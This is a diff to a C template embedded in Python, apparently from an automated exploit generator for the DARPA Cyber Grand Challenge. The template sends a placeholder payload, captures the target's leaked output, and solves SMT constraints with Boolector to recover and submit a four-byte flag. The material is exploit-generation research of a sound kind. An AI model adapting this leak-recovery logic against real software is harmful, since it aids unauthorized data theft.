@@ -1,5 +1,12 @@
 c_template = """
 #include <libcgc.h>
+#include <stdlib.h>
+#include <boolector.h>
+#include <string.h>
+
+/* global output data */
+char *output;
+size_t output_size;
 
 enum register_t
 {
@@ -13,169 +20,13 @@ enum register_t
     edi = 7
 };
 
-typedef char int8_t;
-typedef unsigned char uint8_t;
-typedef short int16_t;
-typedef unsigned short uint16_t;
-typedef int int32_t;
-typedef unsigned int uint32_t;
-typedef long long int64_t;
-typedef unsigned long long uint64_t;
-
-
-int strlen(const char *s) {
-    int i = 0;
-
-    while (*s) {
-        s++; i++;
-    }
-
-    return i;
-}
-
-void debug(const char *str) {
+void die(const char *str) {
     transmit(2, str, strlen(str), NULL);
+    _terminate(1);
 }
 
-void memset(char *dst, char v, size_t n) {
-   size_t i;
-
-   for(i=0;i<n;i++) dst[n] = v;
-}
-
-void *memcpy(void *dst, const void *src, size_t n) {
-   char *d = (char*)dst;
-   const char *s = (const char *)src;
-   while (n--) {*d++ = *s++;}
-   return dst;
-}
-
-char *reverse(char *str, size_t n) {
-
-    char tmp, *src, *dst;
-    size_t len;
-    if (str != NULL)
-    {
-        len = n;
-        if (len > 1) {
-            src = str;
-            dst = src + len - 1;
-            while (src < dst) {
-                tmp = *src;
-                *src++ = *dst;
-                *dst-- = tmp;
-            }
-        }
-    }
-    return str;
-}
-
-/* could probably just be *((int *)reverse(str, n)) */
-long long to_int(char *str, size_t n) {
-   size_t i;
-   long long result = 0;
-
-   for(i=0;i<n;i++) {
-      result |= ((uint8_t) str[n-i-1]) << (i * 8);
-   }
-
-   return result;
-}
-
-char *from_int(char *dst, long long val, size_t n) {
-   size_t i;
-
-   for(i=0;i<n;i++) {
-      dst[n-i-1] = (unsigned char)((val & (0xff << (i * 8))) >> (i * 8));
-   }
-
-   return dst;
-}
-
-char *sub(char *dst, long long operand, size_t n) {
-   long long cint = 0;
-
-   cint = to_int(dst, n) - operand;
-   return from_int(dst, cint, n);
-}
-
-char *add(char *dst, long long operand, size_t n) {
-   long long cint = 0;
-
-   cint = to_int(dst, n) + operand;
-   return from_int(dst, cint, n);
-}
-
-char *and(char *dst, long long operand, size_t n) {
-   long long cint = 0;
-
-   cint = to_int(dst, n) & operand;
-   return from_int(dst, cint, n);
-}
-
-char *xor(char *dst, long long operand, size_t n) {
-   long long cint = 0;
-
-   cint = to_int(dst, n) ^ operand;
-   return from_int(dst, cint, n);
-}
-
-size_t receive_until(int fd, char *dst, char delim, size_t max )
-{
-    size_t len = 0;
-    size_t rx = 0;
-    char c = 0;
-
-    while( len < max ) {
-        dst[len] = 0x00;
-
-        if ( receive( fd, &c, 1, &rx ) != 0 ) {
-            len = 0;
-            goto end;
-        }
-
-        if ( c == delim ) {
-            goto end;
-        }
-
-        dst[len] = c;
-        len++;
-    }
-end:
-    return len;
-}
-
-size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
-{
-  size_t len = 0;
-  size_t rx = 0;
-  while(len < n_bytes) {
-    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
-      len = 0;
-      break;
-    }
-    len += rx;
-  }
-
-  return len;
-}
-
-/*
- * Reverse an integer, same as converting endianness.
- * n is always expected to be 4 at the moment.
- */
-int reverse_int(int to_reverse, size_t n)
-{
-  int new_int = 0;
-
-  if (n == 4) {
-    new_int |= (to_reverse >> 24) & 0xff;
-    new_int |= ((to_reverse >> 16) & 0xff) << 8;
-    new_int |= ((to_reverse >> 8) & 0xff) << 16;
-    new_int |= (to_reverse & 0xff) << 24;
-  }
-
-  return new_int;
+void debug_str(const char *str) {
+    transmit(2, str, strlen(str), NULL);
 }
 
 /*
@@ -203,6 +54,21 @@ int fd_ready(int fd) {
     return 0;
 
   return 1;
+}
+
+size_t receive_n( int fd, unsigned char *dst, size_t n_bytes )
+{
+  size_t len = 0;
+  size_t rx = 0;
+  while(len < n_bytes) {
+    if (receive(fd, dst + len, n_bytes - len, &rx) != 0) {
+      len = 0;
+      break;
+    }
+    len += rx;
+  }
+
+  return len;
 }
 
 /*
@@ -239,6 +105,55 @@ int send_all(int fd, const void *msg, size_t n_bytes)
     len += tx;
   }
   return 0;
+}
+
+char to_char(char *str) {
+  int i;
+  char r = '\\0';
+
+  /* result can '0', '1' or 'x', if 'x' just 0 */
+  for(i=0;i<8;i++)
+    r |= ((str[7-i] - '0') & 1) << i;
+
+  return r;
+}
+
+void to_bits(char *dst, char c) {
+    int i;
+    for(i=0;i<8;i++) {
+        dst[i] = '0' + ((c & (1 << (7-i))) >> (7-i));
+    }
+}
+
+void get_output(size_t n_bytes) {
+    unsigned char *buf = malloc(n_bytes);
+    if (!buf)
+      die("receive buffer malloc failed");
+
+    receive_n(0, buf, n_bytes);
+
+    // convert it to a bitstring
+    //  
+    if (output)
+        output = realloc(output, output_size + (n_bytes * 8) + 1); 
+    else
+        output = malloc(n_bytes * 8 + 1); 
+
+    char *bitbuf = output;
+    if (!bitbuf)
+      die("bitbuf malloc failed");
+
+    size_t i;
+    for(i=0;i<n_bytes;i++) {
+        to_bits(bitbuf + output_size + (i * 8), buf[i]);
+    }   
+
+    bitbuf[output_size + n_bytes * 8] = '\\0';
+
+    /* update output size */
+    output_size = output_size + n_bytes * 8;
+
+    free(buf);
 }
 
 typedef struct type1_vals_ {
@@ -312,24 +227,62 @@ int type2_submit(const unsigned char *val, size_t len) {
 }
 
 
-int main() {
+int do_pov() {
   type2_vals t2vals;
   if (type2_negotiate(&t2vals) != 0) {
     _terminate(0);
   }
 
+  Btor *btor = boolector_new();
+
+  boolector_set_opt(btor, "model_gen", 1);
+
+  const char *smt_stmt = {smt_stmt};
+
+  char *error;
+  int status;
+  boolector_parse(btor, smt_stmt, &error, &status);
+  if (error)
+    die(error);
+
   char payload[] = "{payload}";
-  long long ti;
 
   send_all(1, payload, {payloadsize});
 
-  {transformation_code}
+  {receive_code}
 
+  BoolectorNode *output_var = boolector_match_node_by_id(btor, {output_var_idx});
+  BoolectorNode *cgc_flag_var = boolector_match_node_by_id(btor, {cgc_flag_data_idx});
 
-  flag = reverse_int(flag, 4);
-  type2_submit((unsigned char *)&flag, t2vals.read_size);
+  BoolectorNode *output_val = boolector_const(btor, output);
+
+  BoolectorNode *out_cons = boolector_eq(btor, output_var, output_val);
+
+  boolector_assert(btor, out_cons);
+
+  if (boolector_sat(btor) != BOOLECTOR_SAT)
+    die("unsat");
+
+  char *flag_data = boolector_bv_assignment(btor, cgc_flag_var);
+
+  char flag[4];
+
+  flag[0] = to_char(flag_data + {flag_byte_1} * 8);
+  flag[1] = to_char(flag_data + {flag_byte_2} * 8);
+  flag[2] = to_char(flag_data + {flag_byte_3} * 8);
+  flag[3] = to_char(flag_data + {flag_byte_4} * 8);
+
+  type2_submit((unsigned char *)flag, t2vals.read_size);
 
   return 0;
+}
+
+int main(void) {
+    /* align the stack so that boolector can work in all circumstances */
+    asm(\"and $0xfffffff0, %esp\\n\");
+
+    /* terminate, stack hasn't been fixed up */
+    _terminate(do_pov());
 }
 
 """
